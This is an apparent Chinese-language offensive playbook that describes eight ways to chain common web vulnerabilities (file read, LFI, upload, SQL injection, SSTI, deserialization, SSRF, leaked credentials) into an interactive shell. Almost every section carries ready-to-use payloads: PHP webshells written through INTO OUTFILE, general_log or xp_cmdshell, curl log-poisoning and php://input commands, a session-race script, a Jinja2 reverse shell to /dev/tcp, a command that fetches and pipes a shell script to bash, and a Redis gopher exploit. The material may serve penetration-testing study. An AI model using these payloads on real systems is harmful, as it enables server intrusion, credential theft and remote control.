# Chain Playbook — 漏洞→Shell 串接方法论

> 单个漏洞很少直接等于交互式 Shell。真正的攻击链是：文件读取 → 源码审计 → 找到凭据/注入点 → 写文件/命令执行 → 落地 shell → 绕过限制。本指南梳理 8 条从常见 Web 漏洞到可交互 Shell 的完整链路。

## 关键词

`攻击链` `漏洞链` `attack chain` `文件读取变shell` `SQL注入写shell` `上传变shell` `LFI变shell` `SSRF变shell` `反序列化链` `SSTI链` `凭据横向移动` `权限提升链` `组合利用` `漏洞串联`

---

## 模式 1：文件读取 → 源码 → 凭据 → 数据库 → Webshell

```
LFI/XXE/任意文件读取
  → 读取 /var/www/html/config.php 或 .env
  → 获取 DB_HOST/DB_USER/DB_PASS
  → MySQL root + file_priv → INTO OUTFILE 写 shell.php
  → 或 phpMyAdmin 暴露 → SQL 查询执行 → 写 shell
```

**阶段 A: 文件读取探针**

```bash
# Step 1: 确认 LFI/文件读取存在
/etc/passwd                    → Linux 用户列表
C:\Windows\win.ini             → Windows 确认
../../index.php                → 源码确认

# Step 2: 多路径探针找配置文件
# PHP 常见配置文件
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php            (WordPress)
/var/www/html/inc/config.inc.php
/var/www/html/application/config/database.php  (CodeIgniter)
/var/www/html/app/etc/env.php          (Magento)
/var/www/html/.env.production

# Java 常见配置
/WEB-INF/web.xml
/WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties

# Node.js 常见配置
/server/config/database.js
/.env
/config/config.json

# Step 3: 确认读到的是源码而非渲染后的 HTML
# 用 php://filter 绕过 PHP 解析
php://filter/convert.base64-encode/resource=config.php
# base64 解码后获得纯源码
```

**阶段 B: 凭据提取**

```python
import re

# 常见凭据格式正则
PATTERNS = [
    # PHP define
    r"define\s*\(\s*'DB_(HOST|USER|PASS|NAME|PASSWORD)'\s*,\s*'([^']+)'",
    # PHP 变量
    r"\$(db_host|db_user|db_pass|db_password|db_name)\s*=\s*'([^']+)'",
    # .env / Laravel
    r"(DB_HOST|DB_USERNAME|DB_PASSWORD|DB_DATABASE)=(\S+)",
    # JDBC / Spring
    r"jdbc:mysql://([^/]+)/(\w+)\?user=(\w+)&password=(\S+)",
    r"spring\.datasource\.(url|username|password)=(\S+)",
    # WordPress
    r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'",
    # PDO DSN
    r"mysql:host=([^;]+);dbname=(\w+)",
    r"new PDO\([^,]+,\s*'([^']+)',\s*'([^']+)'"
]

def extract_credentials(source_code):
    creds = []
    for pattern in PATTERNS:
        for match in re.finditer(pattern, source_code, re.IGNORECASE):
            creds.append(match.groups())
    return creds
```

**阶段 C: 数据库写 Shell**

```sql
-- MySQL: 检查写文件权限
SELECT @@secure_file_priv;          -- NULL=完全禁止, ""=无限制, /path=仅该路径
SELECT user(), current_user();      -- 确认当前用户
SHOW VARIABLES LIKE '%file_priv%';  -- 文件权限

-- 如果 secure_file_priv = "" (无限制) 且有 root:
SELECT '<?php @eval($_POST["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- 如果 secure_file_priv 限制了目录:
SELECT '<?php @eval($_POST["c"]); ?>' INTO OUTFILE '/tmp/shell.php';
-- 还需 LFI 包含 /tmp/shell.php

-- 日志写 Shell (无需 file_priv)
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST["c"]); ?>';
SET GLOBAL general_log = OFF;

-- PostgreSQL 写 Shell
CREATE TABLE shell(data text);
COPY shell(data) FROM '/etc/passwd';           -- 读取
COPY shell(data) TO '/tmp/shell.php';          -- 写入
-- 或 COPY ... PROGRAM (9.3+)
COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php';

-- MSSQL 命令执行
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'echo ^<?php @eval($_POST[c]);?^> > C:\inetpub\wwwroot\shell.php';
```

**备用: 如果数据库不可写 shell → 翻数据找管理员密码**

```sql
-- 翻了用户表 → 破解管理员密码 → 登录后台 → 找上传/模板功能 → shell
SELECT * FROM admin;
SELECT * FROM users WHERE role='admin';
SELECT * FROM manager;
```

---

## 模式 2：LFI → Log Poison / Session 劫持 → Webshell

```
LFI 存在
  → php://input / data:// → 直接 RCE
  或
  → 日志污染: User-Agent 注入 PHP 代码 → 包含 access.log
  或
  → Session 文件污染 → PHP_SESSION_UPLOAD_PROGRESS → 竞态包含
```

**路径 A: PHP Wrapper 直接 RCE（最优）**

```bash
# php://input
curl -X POST "http://target/index.php?file=php://input" \
  -d '<?php system("whoami"); ?>'

# data://
curl "http://target/index.php?file=data://text/plain,<?php system('whoami');?>"
curl "http://target/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg=="
```

**路径 B: 日志污染**

```bash
# Step 1: 发送含 PHP 代码的请求 → 写入 access.log
curl "http://target/" -H "User-Agent: <?php system('id'); ?>"
curl "http://target/<?php system('id'); ?>.php"   # 路径注入

# Apache2 日志位置
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache2/error.log
/etc/httpd/logs/access_log

# Nginx 日志位置
/var/log/nginx/access.log
/usr/local/nginx/logs/access.log

# Step 2: LFI 包含日志文件
curl "http://target/index.php?file=../../var/log/apache2/access.log"
# → 执行之前注入的 PHP 代码

# Step 3: 污染 SSH auth.log
ssh '<?php system("id");?>@target'
# → 写入 /var/log/auth.log → 包含

# Step 4: Apache error.log (404 注入)
curl "http://target/<?php system('id');?>" --referer "<?php system('whoami');?>"
```

**路径 C: Session 文件竞态 (PHP < 7.1)**

```python
import threading, requests

def session_lfi_race(target, lfi_param, cmd):
    """利用 PHP_SESSION_UPLOAD_PROGRESS 向 session 文件注入 PHP 代码"""
    sess = requests.Session()

    # 先访问一次获取 PHPSESSID
    sess.get(target + "/index.php")

    def upload():
        files = {"PHP_SESSION_UPLOAD_PROGRESS": (None, f"<?php system('{cmd}'); ?>")}
        sess.post(target + "/upload.php", files={"f": ("a.txt", "a"*100000)},
                  data={"PHP_SESSION_UPLOAD_PROGRESS": f"<?php system('{cmd}'); ?>"})

    def lfi():
        while True:
            r = sess.get(target, params={lfi_param: f"/tmp/sess_{sess.cookies['PHPSESSID']}"})
            if "uid=" in r.text:
                print(f"[+] RACE WON: {r.text}")
                return True

    t_upload = threading.Thread(target=upload)
    t_lfi = threading.Thread(target=lfi)
    t_upload.start(); t_lfi.start()
    t_upload.join(); t_lfi.join()
```

---

## 模式 3：文件上传 → 绕过 → Webshell

```
文件上传点存在
  → 扩展名探测 (白名单/黑名单/无限制)
  → Content-Type 绕过
  → 双扩展名/特殊扩展名绕过
  → 图片马 + LFI 包含
  → .htaccess 覆盖
```

**关键决策树**

```
上传结果:
├─ 上传成功 + URL 返回 → 直接访问 shell.php → DONE
├─ 上传成功 + 被重命名 → 找返回的文件名/路径
├─ 只允许图片扩展名 → 图片马 + 找 LFI 来包含
├─ 文件被 Nginx/Apache 处理但 403 → 检查 .htaccess
├─ WAF 拦截关键字 → [02-webshell] 编码/加密/分块上传
└─ 严格只允许图片 → ImageMagick CVE / PHAR 反序列化
```

---

## 模式 4：SQL 注入 → INTO OUTFILE / xp_cmdshell → Webshell / Shell

```
SQLi 确认
  → 判断权限 (root? DBA? file_priv?)
  → 判断 secure_file_priv / 数据库类型
  → MySQL: INTO OUTFILE / general_log 写 shell
  → MSSQL: xp_cmdshell / sp_OACreate
  → PostgreSQL: COPY PROGRAM / lo_export
  → Oracle: DBMS_SCHEDULER / Java Stored Procedure
  → SQLite: ATTACH DATABASE 写文件
```

**NULL secure_file_priv 的绕过**

```sql
-- MySQL 8.0+ secure_file_priv = NULL → 不能用 INTO OUTFILE
-- 绕过 1: general_log
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php eval($_POST[c]);?>';
SET GLOBAL general_log = OFF;

-- 绕过 2: slow_query_log (同理)
SET GLOBAL slow_query_log = ON;
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
SELECT '<?php eval($_POST[c]);?>' FROM mysql.user WHERE SLEEP(10);
SET GLOBAL slow_query_log = OFF;

-- 绕过 3: UDF 提权 (root + unix socket 可写)
# gcc -shared -o udf.so udf.c -fPIC
# CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
# SELECT sys_exec('chmod 777 /var/www/html/shell.php');

-- 绕过 4: MOF (Windows MySQL < 5.7)
# 写 MOF 到 C:\Windows\System32\wbem\mof\
# SELECT 0x... INTO DUMPFILE 'C:/Windows/System32/wbem/mof/shell.mof';
# → WMI 自动执行 MOF → 创建管理员账户或执行命令
```

---

## 模式 5：SSTI → RCE → Reverse Shell

```
SSTI 确认 ({{7*7}} → 49)
  → 识别模板引擎 (Jinja2/Twig/Freemarker/Velocity/Smarty...)
  → 沙箱逃逸 → os.popen / subprocess
  → 反弹 shell 或读 flag
```

**链示例 (Jinja2)**

```python
# Step 1: 确认 Jinja2 → {{7*7}} = 49
# Step 2: 探测 __mro__ / __subclasses__
# {{ ''.__class__.__mro__[1].__subclasses__() }}

# Step 3: 找 os._wrap_close 或 subprocess.Popen
# 搜索 warnings.catch_warnings 或 subprocess.Popen 的索引

# Step 4: 反弹 shell
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"').read() }}

# 或写 webshell
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/var/www/html/shell.php','w').write('<?php system($_GET[c]);?>') }}

# 无 {{ 时 → {% 控制流
{% for x in ().__class__.__mro__[1].__subclasses__() %}
  {% if "catch_warnings" in x.__name__ %}
    {{ x.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
  {% endif %}
{% endfor %}
```

---

## 模式 6：反序列化 → Gadget Chain → RCE

```
可控反序列化点
  → 识别语言 (PHP/Java/Python/Node.js)
  → 构建/查找 Gadget Chain
  → PHP: 原生类 (SoapClient/SimpleXMLElement) → SSRF/XXE
  → 或 ysoserial / phpggc 生成 payload
  → Java: CommonsCollections/Spring → Runtime.exec()
  → Python: pickle __reduce__ → os.system
```

**PHP 通用链思路**

```php
<?php
// 如果没有自定义类可利用 → 走原生类链
// 链 1: 反序列化 → SoapClient → SSRF → 内网服务 → RCE
// 链 2: 反序列化 → phar:// 伪协议 → 二次反序列化

// phpggc 自动生成
// phpggc Laravel/RCE1 system 'id' -b  # base64
// phpggc Symfony/RCE4 exec 'curl IP/shell.sh|bash'
```

---

## 模式 7：SSRF → 内网/本地服务 → RCE

```
SSRF 确认
  ├─ gopher://127.0.0.1:6379 → Redis (CONFIG SET dir + dbfilename → 写 webshell)
  ├─ gopher://127.0.0.1:9000 → PHP-FPM (FastCGI → PHP_VALUE auto_prepend_file)
  ├─ gopher://127.0.0.1:3306 → MySQL (客户端攻击/Rogue Server)
  ├─ dict://127.0.0.1:11211 → Memcached (stat/gets)
  ├─ gopher://127.0.0.1:2375 → Docker API (create container + mount host → escape)
  └─ http://169.254.169.254 → Cloud Metadata (获取凭据 → 管理面 RCE)
```

**Redis → Webshell (最经典)**

```bash
# Gopher 协议构造
# redis 命令:
# FLUSHALL
# CONFIG SET dir /var/www/html
# CONFIG SET dbfilename shell.php
# SET shell "<?php @eval($_POST['c']);?>"
# SAVE

# curl 直接打
curl "gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$28%0d%0a<?php @eval(\$_POST['c']);?>%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$13%0d%0a/var/www/html%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$9%0d%0ashell.php%0d%0a*1%0d%0a\$4%0d%0asave%0d%0a"
```

**PHP-FPM FastCGI → Shell**

```python
# 直接打 PHP-FPM socket (Gopher/SSRF)
# 设置 FastCGI 参数 PHP_VALUE: auto_prepend_file = php://input
# POST body: <?php system('whoami'); ?>
# → PHP 在处理任何 PHP 文件前执行 POST body

# 使用 Gopherus 工具生成 payload
# python gopherus.py --exploit php_fpm
```

---

## 模式 8：凭据暴露 → 后台/管理面板 → 模板/插件上传 → Shell

```
配置泄露/默认密码/弱密码
  → 登录管理后台 (/admin, /phpmyadmin, /wp-admin)
  → 查找模板编辑功能 → 在模板 PHP 文件中写入 webshell
  → 或插件上传 → 上传伪装的插件/主题 ZIP
  → 或数据库管理 → SQL 执行 → 写 shell
```

**CMS 特有路径**

```
WordPress:
  wp-admin → Appearance → Theme Editor → 404.php → 插入 <?php system($_GET['c']);?>
  wp-admin → Plugins → Upload → 上传含 webshell 的 zip

Drupal:
  admin/config → 安装自定义 module

Magento:
  admin → System → Configuration → Developer → Template Settings → 允许 Symlinks
  → 通过图片上传 webshell → symlink → template 包含

ThinkPHP:
  app/controller 目录可写 → 创建新控制器 <?php system(input('cmd')); ?>
```

---

## 总结：链选择原则

| 初始漏洞 | 先决条件 | 首选链 | 备选链 |
|---------|---------|--------|--------|
| 任意文件读取 | 无 | 读源码→凭据→数据库写 shell | 读/proc/self/environ→环境变量 |
| LFI / File Include | PHP, allow_url_include=On? | php://input / data:// | 日志污染 / Session 竞态 |
| 文件上传 | 白名单/黑名单 | 扩展名绕过→直接访问 | 图片马→LFI 包含 |
| SQL 注入 | root + file_priv | INTO OUTFILE 写 shell | general_log 写 shell |
| SSTI | Jinja2/Twig 等 | 沙箱逃逸→反弹 shell | 沙箱逃逸→写 webshell |
| 反序列化 | 有 gadget 链 | RCE gadget→反弹 shell | SSRF gadget→内网 |
| SSRF | 内网服务可达 | Redis→写 webshell | PHP-FPM→RCE |
| 弱密码/配置泄露 | 管理员入口 | 后台模板编辑→写入 shell | phpMyAdmin→SQL 写 shell |

---

## 关联技术

- [[00-overview]] — RCE 全景
- [[01-command-injection]] — 命令注入
- [[02-webshell]] — Webshell 免杀
- [[03-php-disable-functions-bypass]] — PHP disable_functions
- [[04-reverse-shell-bind]] — 反弹/绑定 Shell
- [[file-upload-xxe-lfi]] — 文件上传/XXE/LFI
- [[01-sqli-fundamentals]] — SQL 注入
- [[ssti]] — SSTI 模板注入
- [[deserialization]] — 反序列化
- [[ssrf]] — SSRF
